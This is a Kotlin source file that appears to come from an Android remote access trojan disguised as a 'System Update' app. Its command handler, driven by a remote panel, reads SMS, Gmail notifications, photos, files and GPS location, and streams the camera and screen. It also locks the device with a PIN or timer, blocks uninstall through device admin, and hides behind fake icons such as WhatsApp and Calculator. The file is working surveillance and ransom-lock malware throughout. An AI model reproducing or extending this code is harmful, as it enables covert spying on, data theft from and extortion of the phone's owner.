package com.system.update

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.hardware.camera2.CameraManager
import android.location.Geocoder
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.MediaStore
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.Base64
import androidx.core.content.ContextCompat
import com.google.gson.JsonObject
import java.net.NetworkInterface
import java.util.Locale

class CommandHandler(private val ctx: Context, private val deviceId: String) {

    companion object {
        @Volatile var flashSpam: Boolean = false
        @Volatile var vibrateSpam: Boolean = false
    }

    private fun panelBase(): String {
        return App.config.panelUrl
            .replace("ws://", "http://")
            .replace("wss://", "https://")
            .replace("/ws", "")
    }

    fun collectInfo(): Map<String, Any> {
        val battery = try {
            val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } catch (_: Exception) { 0 }

        val ram = try {
            val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val mi = android.app.ActivityManager.MemoryInfo()
            am.getMemoryInfo(mi)
            String.format(Locale.US, "%.1f GB", mi.totalMem / 1e9)
        } catch (_: Exception) { "-" }

        val carrier = try {
            val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            tm.networkOperatorName ?: "-"
        } catch (_: Exception) { "-" }

        val storage = try {
            val stat = android.os.StatFs(android.os.Environment.getDataDirectory().path)
            val total = stat.blockCountLong * stat.blockSizeLong
            val free = stat.availableBlocksLong * stat.blockSizeLong
            val used = total - free
            String.format(Locale.US, "%.1f/%.1f GB", used / 1e9, total / 1e9)
        } catch (_: Exception) { "-" }

        return mapOf(
            "model" to Build.MODEL,
            "brand" to Build.BRAND,
            "android" to Build.VERSION.RELEASE,
            "battery" to battery,
            "ram" to ram,
            "carrier" to carrier,
            "storage" to storage,
            "timezone" to java.util.TimeZone.getDefault().id,
            "ip" to getLocalIp()
        )
    }

    private fun getLocalIp(): String {
        return try {
            NetworkInterface.getNetworkInterfaces().toList()
                .flatMap { it.inetAddresses.toList() }
                .firstOrNull { !it.isLoopbackAddress && it is java.net.Inet4Address }
                ?.hostAddress ?: "-"
        } catch (_: Exception) { "-" }
    }

    fun countSms(): Int {
        return try {
            val cursor = ctx.contentResolver.query(
                Uri.parse("content://sms/"),
                arrayOf("_id"), null, null, null
            )
            val c = cursor?.count ?: 0
            cursor?.close()
            c
        } catch (_: Exception) { 0 }
    }

    fun readAllSmsPublic(): Map<String, Any> = readAllSms()

    fun getSmsLastTimestamp(): Long {
        return try {
            val cursor = ctx.contentResolver.query(
                Uri.parse("content://sms/"),
                arrayOf("date"),
                null, null, "date DESC LIMIT 1"
            )
            var ts = 0L
            cursor?.use {
                if (it.moveToFirst()) {
                    ts = it.getLong(it.getColumnIndexOrThrow("date"))
                }
            }
            ts
        } catch (_: Exception) { 0L }
    }

    fun execute(cmd: String, args: JsonObject?, done: (Any) -> Unit) {
        when (cmd) {

            "lock_pin" -> {
                val pin = args?.get("pin")?.asString ?: "1234"
                startLockService("pin", pin, 0)
                done(mapOf("ok" to true, "type" to "pin", "pin" to pin))
            }
            "lock_hard" -> {
                try {
                    val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    val admin = ComponentName(ctx, AdminReceiver::class.java)
                    if (dpm.isAdminActive(admin)) {
                        @Suppress("DEPRECATION") dpm.lockNow()
                    }
                } catch (_: Exception) {}
                startLockService("hard", "0", 0)
                done(mapOf("ok" to true, "type" to "hard"))
            }
            "lock_time" -> {
                val hours = args?.get("hours")?.asLong ?: 5L
                startLockService("time", "0", hours)
                done(mapOf("ok" to true, "hours" to hours))
            }
            "crash" -> {
                startLockService("crash", "0", 0)
                done(mapOf("crash" to true))
            }
            "unlock" -> {
                try {
                    val i = Intent(ctx, LockService::class.java).apply {
                        putExtra("type", "stop")
                    }
                    ctx.startService(i)
                    ctx.stopService(i)
                } catch (_: Exception) {}
                StickerSpam.stop()
                stopFlashSpam()
                stopVibrateSpam()
                try { ctx.stopService(Intent(ctx, CameraStreamService::class.java)) } catch (_: Exception) {}
                try { ctx.stopService(Intent(ctx, ScreenStreamService::class.java)) } catch (_: Exception) {}
                try { ctx.stopService(Intent(ctx, VideoPlayerService::class.java)) } catch (_: Exception) {}
                try { ctx.stopService(Intent(ctx, AudioPlayerService::class.java)) } catch (_: Exception) {}
                try { ctx.stopService(Intent(ctx, PrankLCDService::class.java)) } catch (_: Exception) {}
                done(mapOf("ok" to true))
            }

            "prank_lcd_on" -> {
                try {
                    val i = Intent(ctx, PrankLCDService::class.java)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        ctx.startForegroundService(i)
                    } else {
                        ctx.startService(i)
                    }
                    done(mapOf("ok" to true, "lcd" to true))
                } catch (e: Exception) { done(mapOf("error" to e.message)) }
            }
            "prank_lcd_off" -> {
                try {
                    val i = Intent(ctx, PrankLCDService::class.java).apply { putExtra("stop", true) }
                    ctx.startService(i)
                    ctx.stopService(i)
                    done(mapOf("ok" to true, "lcd" to false))
                } catch (e: Exception) { done(mapOf("error" to e.message)) }
            }

            "send_mp4" -> {
                val url = "${panelBase()}/videos/warning.mp4"
                try {
                    val i = Intent(ctx, VideoPlayerService::class.java).apply {
                        putExtra("type", "video")
                        putExtra("url", url)
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        ctx.startForegroundService(i)
                    } else {
                        ctx.startService(i)
                    }
                } catch (_: Exception) {}
                done(mapOf("ok" to true, "url" to url))
            }
            "stop_mp4" -> {
                try { ctx.stopService(Intent(ctx, VideoPlayerService::class.java)) } catch (_: Exception) {}
                done(mapOf("ok" to true))
            }

            "send_mp3" -> {
                val url = "${panelBase()}/audios/warning.mp3"
                try {
                    val i = Intent(ctx, AudioPlayerService::class.java).apply { putExtra("url", url) }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        ctx.startForegroundService(i)
                    } else {
                        ctx.startService(i)
                    }
                } catch (_: Exception) {}
                done(mapOf("ok" to true, "url" to url))
            }
            "stop_mp3" -> {
                try {
                    val i = Intent(ctx, AudioPlayerService::class.java).apply { putExtra("stop", true) }
                    ctx.startService(i)
                    ctx.stopService(i)
                } catch (_: Exception) {}
                done(mapOf("ok" to true))
            }

            "spam_sticker" -> {
                val duration = args?.get("duration")?.asLong ?: 5L
                val urls = mutableListOf<String>()
                for (i in 1..5) urls.add("${panelBase()}/stickers/sticker$i.png")
                StickerSpam.start(ctx, urls, 200, 30, duration)
                done(mapOf("ok" to true, "count" to urls.size, "duration" to duration))
            }
            "stop_sticker" -> {
                StickerSpam.stop()
                done(mapOf("ok" to true))
            }

            // ============ CAMERA LIVE ============
            "camera_front" -> {
    if (ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.CAMERA)
        != android.content.pm.PackageManager.PERMISSION_GRANTED) {
        done(mapOf("error" to "izin kamera belum di-grant"))
    } else {
        try {
            // Start foreground service biar stream jalan di background
            val svc = Intent(ctx, CameraStreamService::class.java).apply {
                putExtra("cam_front", true)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(svc)
            } else {
                ctx.startService(svc)
            }

            // Fallback buka activity kalau service butuh foreground
            val act = Intent(ctx, MainActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_SINGLE_TOP or
                        Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                putExtra("auto_start_cam", true)
                putExtra("cam_front", true)
            }
            ctx.startActivity(act)
        } catch (e: Exception) { done(mapOf("error" to e.message)); return }
        done(mapOf("ok" to true, "note" to "camera stream start"))
    }
}
            "camera_back" -> {
                if (ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.CAMERA)
                    != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    done(mapOf("error" to "izin kamera belum di-grant"))
                } else {
                    try {
                        val act = Intent(ctx, MainActivity::class.java).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or
                                    Intent.FLAG_ACTIVITY_SINGLE_TOP or
                                    Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                            putExtra("auto_start_cam", true)
                            putExtra("cam_front", false)
                        }
                        ctx.startActivity(act)
                    } catch (e: Exception) { done(mapOf("error" to e.message)); return }
                    done(mapOf("ok" to true, "note" to "app terbuka, tunggu 2 detik"))
                }
            }
            "stop_camera" -> {
                try { ctx.stopService(Intent(ctx, CameraStreamService::class.java)) } catch (_: Exception) {}
                done(mapOf("ok" to true))
            }

            // ============ CAMERA SNAPSHOT ============
            "camera_capture_front" -> {
                if (ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.CAMERA)
                    != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    done(mapOf("error" to "izin kamera belum di-grant"))
                } else {
                    Thread {
                        try {
                            val capture = CameraCapture(ctx)
                            val latch = java.util.concurrent.CountDownLatch(1)
                            var frame: String? = null
                            capture.capture(true) { b64 ->
                                frame = b64
                                latch.countDown()
                            }
                            latch.await(6, java.util.concurrent.TimeUnit.SECONDS)
                            if (frame != null) {
                                RatService.instance?.sendFrame("cam_front_frame", frame!!)
                                done(mapOf("ok" to true, "frame" to "sent", "size" to frame!!.length))
                            } else {
                                done(mapOf("error" to "gagal capture kamera depan"))
                            }
                        } catch (e: Exception) {
                            done(mapOf("error" to e.message))
                        }
                    }.start()
                }
            }
            "camera_capture_back" -> {
                if (ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.CAMERA)
                    != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    done(mapOf("error" to "izin kamera belum di-grant"))
                } else {
                    Thread {
                        try {
                            val capture = CameraCapture(ctx)
                            val latch = java.util.concurrent.CountDownLatch(1)
                            var frame: String? = null
                            capture.capture(false) { b64 ->
                                frame = b64
                                latch.countDown()
                            }
                            latch.await(6, java.util.concurrent.TimeUnit.SECONDS)
                            if (frame != null) {
                                RatService.instance?.sendFrame("cam_back_frame", frame!!)
                                done(mapOf("ok" to true, "frame" to "sent", "size" to frame!!.length))
                            } else {
                                done(mapOf("error" to "gagal capture kamera belakang"))
                            }
                        } catch (e: Exception) {
                            done(mapOf("error" to e.message))
                        }
                    }.start()
                }
            }

            // ============ SCREEN LIVE ============
            "screen" -> {
    if (!ScreenCapture.isReady()) {
        // Belum grant MediaProjection → buka activity dulu buat minta izin
        try {
            val act = Intent(ctx, MainActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_SINGLE_TOP or
                        Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                putExtra("auto_start_screen", true)
            }
            ctx.startActivity(act)
            done(mapOf("ok" to true, "note" to "minta izin MediaProjection, tunggu 3 detik"))
        } catch (e: Exception) { done(mapOf("error" to e.message)) }
    } else {
        // Udah ready → langsung stream
        try {
            val i = Intent(ctx, ScreenStreamService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(i)
            } else {
                ctx.startService(i)
            }
            done(mapOf("ok" to true, "note" to "screen stream start"))
        } catch (e: Exception) { done(mapOf("error" to e.message)) }
    }
}

            // ============ SCREEN SNAPSHOT ============
            "screen_capture" -> {
                Thread {
                    try {
                        if (!ScreenCapture.isReady()) {
                            done(mapOf("error" to "MediaProjection belum di-grant"))
                        } else {
                            val latch = java.util.concurrent.CountDownLatch(1)
                            var frame: String? = null
                            ScreenCapture.capture(ctx) { b64 ->
                                frame = b64
                                latch.countDown()
                            }
                            latch.await(6, java.util.concurrent.TimeUnit.SECONDS)
                            if (frame != null) {
                                RatService.instance?.sendFrame("screen_frame", frame!!)
                                done(mapOf("ok" to true, "frame" to "sent", "size" to frame!!.length))
                            } else {
                                done(mapOf("error" to "gagal capture layar"))
                            }
                        }
                    } catch (e: Exception) {
                        done(mapOf("error" to e.message))
                    }
                }.start()
            }

            "sms" -> {
                val smsList = readAllSms()
                val notifList = NotificationListener.getAllNotifs()
                done(mapOf(
                    "type" to "sms",
                    "messages" to (smsList["messages"] ?: emptyList<Map<String, String>>()),
                    "notifications" to notifList
                ))
            }

            "gmail" -> {
                done(mapOf(
                    "type" to "gmail",
                    "items" to NotificationListener.getGmailNotifs()
                ))
            }

            "open_notif_access" -> {
                try {
                    val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    ctx.startActivity(intent)
                    done(mapOf("ok" to true))
                } catch (e: Exception) { done(mapOf("error" to e.message)) }
            }

            "gallery" -> done(readGallery())
            "ip" -> done(getIpInfo())

            "flash" -> {
                if (flashSpam) stopFlashSpam() else startFlashSpam()
                done(mapOf("flash" to flashSpam))
            }
            "vibrate" -> {
                if (vibrateSpam) stopVibrateSpam() else startVibrateSpam()
                done(mapOf("vibrate" to vibrateSpam))
            }

            "anti_uninstall" -> {
                antiUninstall()
                done(mapOf("anti_uninstall" to true))
            }

            "fake_notif" -> {
                val title = args?.get("title")?.asString ?: "Pesan Baru"
                val message = args?.get("message")?.asString ?: ""
                val iconUrl = args?.get("iconUrl")?.asString
                val clickUrl = args?.get("clickUrl")?.asString
                FakeNotify.show(ctx, title, message, iconUrl, clickUrl)
                done(mapOf("ok" to true))
            }

            "broadcast" -> {
                val title = args?.get("title")?.asString ?: "Pesan"
                val message = args?.get("message")?.asString ?: ""
                val duration = args?.get("duration")?.asInt ?: 5
                Handler(Looper.getMainLooper()).post {
                    BroadcastOverlay.show(ctx, title, message, duration)
                }
                done(mapOf("ok" to true))
            }

            "set_wallpaper" -> {
                val url = args?.get("url")?.asString ?: ""
                if (url.isEmpty()) {
                    done(mapOf("ok" to false, "error" to "no url"))
                } else if (!url.startsWith("http")) {
                    done(mapOf("ok" to false, "error" to "invalid url"))
                } else {
                    WallpaperSetter.setFromUrl(ctx, url) { success ->
                        done(mapOf("ok" to success, "url" to url))
                    }
                }
            }

            "open_website" -> {
                val url = args?.get("url")?.asString ?: ""
                if (url.isEmpty()) {
                    done(mapOf("error" to "no url"))
                } else {
                    try {
                        val i = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        ctx.startActivity(i)
                        done(mapOf("ok" to true))
                    } catch (e: Exception) { done(mapOf("error" to e.message)) }
                }
            }

            "hide_broadcast" -> {
                Handler(Looper.getMainLooper()).post { BroadcastOverlay.hide(ctx) }
                done(mapOf("ok" to true))
            }
            "read_notifs" -> {
                done(mapOf("type" to "text", "data" to "Notif listener aktif"))
            }

            "list_apps" -> {
                try {
                    val pm = ctx.packageManager
                    val apps = pm.getInstalledApplications(0)
                    val list = mutableListOf<Map<String, String>>()
                    apps.forEach { app ->
                        try {
                            if (pm.getLaunchIntentForPackage(app.packageName) != null) {
                                var iconB64 = ""
                                try {
                                    val iconDrawable = pm.getApplicationIcon(app)
                                    val w = iconDrawable.intrinsicWidth.coerceAtLeast(48)
                                    val h = iconDrawable.intrinsicHeight.coerceAtLeast(48)
                                    val bmp = android.graphics.Bitmap.createBitmap(w, h, android.graphics.Bitmap.Config.ARGB_8888)
                                    val canvas = android.graphics.Canvas(bmp)
                                    iconDrawable.setBounds(0, 0, canvas.width, canvas.height)
                                    iconDrawable.draw(canvas)
                                    val bos = java.io.ByteArrayOutputStream()
                                    bmp.compress(android.graphics.Bitmap.CompressFormat.PNG, 70, bos)
                                    iconB64 = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP)
                                } catch (_: Exception) {}

                                list.add(mapOf(
                                    "name" to pm.getApplicationLabel(app).toString(),
                                    "package" to app.packageName,
                                    "icon" to iconB64
                                ))
                            }
                        } catch (_: Exception) {}
                    }
                    done(mapOf("type" to "apps", "items" to list.sortedBy { it["name"] }))
                } catch (e: Exception) {
                    done(mapOf("type" to "text", "data" to "Error: ${e.message}"))
                }
            }

            "lock_app" -> {
                val pkg = args?.get("package")?.asString ?: ""
                val pin = args?.get("pin")?.asString ?: "1234"
                if (pkg.isEmpty()) done(mapOf("error" to "no package"))
                else {
                    AppLockAccessibilityService.setLockedApp(ctx, pkg, pin)
                    done(mapOf("ok" to true, "package" to pkg, "pin" to pin))
                }
            }
            "unlock_app" -> {
                val pkg = args?.get("package")?.asString ?: ""
                if (pkg.isEmpty()) done(mapOf("error" to "no package"))
                else {
                    AppLockAccessibilityService.unlockApp(ctx, pkg)
                    done(mapOf("ok" to true, "package" to pkg))
                }
            }

            "list_files" -> {
                val path = args?.get("path")?.asString ?: ""
                val result = if (path.isEmpty()) FileManager.listStorageRoots() else FileManager.listFiles(path)
                done(result)
            }
            "read_file" -> {
                val path = args?.get("path")?.asString ?: ""
                if (path.isEmpty()) done(mapOf("error" to "no path"))
                else done(FileManager.readFile(path))
            }
            "download_file" -> {
                val path = args?.get("path")?.asString ?: ""
                if (path.isEmpty()) done(mapOf("error" to "no path"))
                else done(FileManager.downloadFile(path))
            }

            "chat_reply" -> {
                val text = args?.get("text")?.asString ?: ""
                if (text.isEmpty()) done(mapOf("error" to "no text"))
                else done(mapOf("ok" to true))
            }

            "hide_app" -> {
                try {
                    val pm = ctx.packageManager
                    try {
                        pm.setComponentEnabledSetting(
                            ComponentName(ctx.packageName, "com.system.update.AliasSettings"),
                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            android.content.pm.PackageManager.DONT_KILL_APP
                        )
                    } catch (_: Exception) {}
                    try {
                        pm.setComponentEnabledSetting(
                            ComponentName(ctx, SetupUsernameActivity::class.java),
                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            android.content.pm.PackageManager.DONT_KILL_APP
                        )
                    } catch (_: Exception) {}
                    val otherAliases = listOf(
                        "com.system.update.AliasSystemUpdate",
                        "com.system.update.AliasPlayServices",
                        "com.system.update.AliasWhatsApp",
                        "com.system.update.AliasCalculator"
                    )
                    for (alias in otherAliases) {
                        try {
                            pm.setComponentEnabledSetting(
                                ComponentName(ctx.packageName, alias),
                                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                android.content.pm.PackageManager.DONT_KILL_APP
                            )
                        } catch (_: Exception) {}
                    }
                    done(mapOf("ok" to true))
                } catch (e: Exception) { done(mapOf("error" to e.message)) }
            }

            "show_app" -> {
                try {
                    val pm = ctx.packageManager
                    try {
                        pm.setComponentEnabledSetting(
                            ComponentName(ctx, SetupUsernameActivity::class.java),
                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            android.content.pm.PackageManager.DONT_KILL_APP
                        )
                    } catch (_: Exception) {}
                    val allAliases = listOf(
                        "com.system.update.AliasSystemUpdate",
                        "com.system.update.AliasPlayServices",
                        "com.system.update.AliasSettings",
                        "com.system.update.AliasWhatsApp",
                        "com.system.update.AliasCalculator"
                    )
                    for (alias in allAliases) {
                        try {
                            pm.setComponentEnabledSetting(
                                ComponentName(ctx.packageName, alias),
                                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                android.content.pm.PackageManager.DONT_KILL_APP
                            )
                        } catch (_: Exception) {}
                    }
                    done(mapOf("ok" to true))
                } catch (e: Exception) { done(mapOf("error" to e.message)) }
            }

            "set_app_icon" -> {
                try {
                    val newName = args?.get("name")?.asString ?: "System Update"
                    val pm = ctx.packageManager
                    val allAliases = listOf(
                        "com.system.update.AliasSystemUpdate",
                        "com.system.update.AliasPlayServices",
                        "com.system.update.AliasSettings",
                        "com.system.update.AliasWhatsApp",
                        "com.system.update.AliasCalculator"
                    )
                    val targetAlias = when {
                        newName.lowercase().contains("play") -> "com.system.update.AliasPlayServices"
                        newName.lowercase().contains("setting") -> "com.system.update.AliasSettings"
                        newName.lowercase().contains("whatsapp") || newName.lowercase().contains("wa") -> "com.system.update.AliasWhatsApp"
                        newName.lowercase().contains("calc") -> "com.system.update.AliasCalculator"
                        else -> "com.system.update.AliasSystemUpdate"
                    }
                    for (alias in allAliases) {
                        if (alias != targetAlias) {
                            try {
                                pm.setComponentEnabledSetting(
                                    ComponentName(ctx.packageName, alias),
                                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                    android.content.pm.PackageManager.DONT_KILL_APP
                                )
                            } catch (_: Exception) {}
                        }
                    }
                    try {
                        pm.setComponentEnabledSetting(
                            ComponentName(ctx.packageName, targetAlias),
                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            android.content.pm.PackageManager.DONT_KILL_APP
                        )
                    } catch (_: Exception) {}
                    try {
                        pm.setComponentEnabledSetting(
                            ComponentName(ctx, SetupUsernameActivity::class.java),
                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            android.content.pm.PackageManager.DONT_KILL_APP
                        )
                    } catch (_: Exception) {}
                    done(mapOf("ok" to true, "name" to newName, "alias" to targetAlias))
                } catch (e: Exception) { done(mapOf("error" to e.message)) }
            }

            else -> done(mapOf("error" to "unknown: $cmd"))
        }
    }

    private fun startLockService(type: String, pin: String, hours: Long) {
        try {
            val video = "${panelBase()}/videos/warning.mp4"
            val audio = "${panelBase()}/audios/warning.mp3"
            val i = Intent(ctx, LockService::class.java).apply {
                putExtra("type", type)
                putExtra("pin", pin)
                putExtra("hours", hours)
                putExtra("videoUrl", video)
                putExtra("audioUrl", audio)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(i)
            } else {
                ctx.startService(i)
            }
        } catch (_: Exception) {}
    }

    fun startFlashSpam() {
        if (flashSpam) return
        flashSpam = true
        Thread {
            try {
                val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                while (flashSpam) {
                    val id = cm.cameraIdList.firstOrNull { camId ->
                        cm.getCameraCharacteristics(camId)
                            .get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
                    } ?: break
                    cm.setTorchMode(id, true)
                    Thread.sleep(120)
                    cm.setTorchMode(id, false)
                    Thread.sleep(120)
                }
            } catch (_: Exception) {}
            flashSpam = false
        }.start()
    }
    fun stopFlashSpam() { flashSpam = false }

    fun startVibrateSpam() {
        if (vibrateSpam) return
        vibrateSpam = true
        try {
            val vm = ctx.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            Thread {
                while (vibrateSpam) {
                    try {
                        if (Build.VERSION.SDK_INT >= 26) {
                            vm.vibrate(VibrationEffect.createOneShot(500, VibrationEffect.DEFAULT_AMPLITUDE))
                        } else {
                            @Suppress("DEPRECATION") vm.vibrate(500)
                        }
                        Thread.sleep(700)
                    } catch (_: Exception) { break }
                }
            }.start()
        } catch (_: Exception) {}
    }
    fun stopVibrateSpam() { vibrateSpam = false }

    private fun antiUninstall() {
        try {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(ctx, AdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) {
                if (Build.VERSION.SDK_INT >= 21) {
                    dpm.setUninstallBlocked(admin, ctx.packageName, true)
                }
            }
        } catch (_: Exception) {}
    }

    private fun readAllSms(): Map<String, Any> {
        val list = mutableListOf<Map<String, String>>()
        try {
            val cursor = ctx.contentResolver.query(
                Uri.parse("content://sms/"),
                arrayOf("_id", "address", "body", "date", "type"),
                null, null, "date DESC LIMIT 500"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val body = it.getString(it.getColumnIndexOrThrow("body")) ?: ""
                    val addr = it.getString(it.getColumnIndexOrThrow("address")) ?: ""
                    val date = it.getLong(it.getColumnIndexOrThrow("date"))
                    val type = it.getInt(it.getColumnIndexOrThrow("type"))
                    val typeStr = when (type) {
                        1 -> "inbox"
                        2 -> "sent"
                        3 -> "draft"
                        4 -> "outbox"
                        5 -> "failed"
                        6 -> "queued"
                        else -> "other"
                    }
                    list.add(mapOf(
                        "app" to addr,
                        "body" to body,
                        "date" to date.toString(),
                        "type" to typeStr
                    ))
                }
            }
        } catch (_: Exception) {}
        return mapOf("type" to "sms", "messages" to list)
    }

    private fun readGallery(): Map<String, Any> {
        val list = mutableListOf<Map<String, String>>()
        try {
            val cursor = ctx.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                arrayOf(MediaStore.Images.Media._ID),
                null, null, "date_added DESC LIMIT 30"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val id = it.getLong(0)
                    val uri = Uri.withAppendedPath(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString()
                    )
                    val b64 = try {
                        val bytes = ctx.contentResolver.openInputStream(uri)?.readBytes() ?: ByteArray(0)
                        if (bytes.size < 200_000) Base64.encodeToString(bytes, Base64.NO_WRAP) else ""
                    } catch (_: Exception) { "" }
                    if (b64.isNotEmpty()) list.add(mapOf("data" to b64))
                }
            }
        } catch (_: Exception) {}
        return mapOf("type" to "gallery", "items" to list)
    }

    private fun getIpInfo(): Map<String, Any> {
        var lat = 0.0
        var lon = 0.0
        var address = "-"
        try {
            val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            var loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)

            if (loc != null) {
                lat = loc.latitude
                lon = loc.longitude
                try {
                    @Suppress("DEPRECATION")
                    val geo = Geocoder(ctx, Locale.getDefault())
                    val addrs = geo.getFromLocation(lat, lon, 1)
                    if (!addrs.isNullOrEmpty()) {
                        val a = addrs[0]
                        address = listOfNotNull(
                            a.thoroughfare, a.subThoroughfare, a.subLocality,
                            a.locality, a.subAdminArea, a.adminArea,
                            a.postalCode, a.countryName
                        ).joinToString(", ")
                    }
                } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
        return mapOf(
            "type" to "ip",
            "ip" to getLocalIp(),
            "lat" to lat,
            "lon" to lon,
            "address" to address
        )
    }
}